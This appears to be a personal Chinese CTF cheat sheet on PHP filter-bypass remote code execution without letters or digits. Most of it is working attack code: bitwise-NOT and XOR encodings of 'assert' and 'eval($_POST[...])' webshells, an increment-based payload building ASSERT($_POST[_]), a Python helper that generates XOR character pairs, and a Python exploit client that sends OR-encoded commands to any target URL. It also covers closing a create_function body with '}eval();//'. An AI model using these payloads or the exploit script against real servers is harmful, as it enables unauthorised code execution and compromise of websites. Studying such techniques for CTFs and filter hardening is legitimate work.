# 无数字字母RCE
## 取反
```php
<?php 
$a=urlencode(~'assert');
echo $a;
echo '666';
$b=urlencode(~'eval($_POST[1]);');
echo $b;
```
## 异或
```PHP
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

```python
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
​
answer = str(input("请输入进行异或构造的字符串："))
​
tmp1, tmp2 = '', ''
for c in answer:
  for i in valid:
    for j in valid:
      if (ord(i) ^ ord(j) == ord(c)):
        tmp1 += i
        tmp2 += j
        break
    else:
      continue
    break
print("tmp1为:",tmp1)
print("tmp2为:",tmp2)
```
## 或
见`D:\web\script\CTF`
```PYTHON
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os

#os.system("php rce_or.php")  # 没有将php写入环境变量需手动运行,我是懒狗不想搭php环境
#下次直接小皮生成
if (len(argv) != 2):
    print("=" * 50)
    print('USER：python exp.py <url>')
    print("eg：  python exp.py http://ysy.com")
    print("=" * 50)
    exit(0)
url = argv[1]


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("rce_or.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)


while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))
    data = {
        'c': urllib.parse.unquote(param)
    }
    r = requests.post(url, data=data)
    print("\n[*] result:\n" + r.text)

```
## 自增
```PHP
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
## 临时文件
# 无参数RCE

# create_function
```PHP
create_function(string $args,string )
//string $args 声明的函数变量部分
//string $code 执行的方法代码部分
```

执行过程等价于
```PHP
function a($arg,$code){ 
	return $code
}
```

在`$code`插入`}eval();//`

`}`将函数闭合`//`注释后一个`}`中间注入的恶意代码就可以正常执行。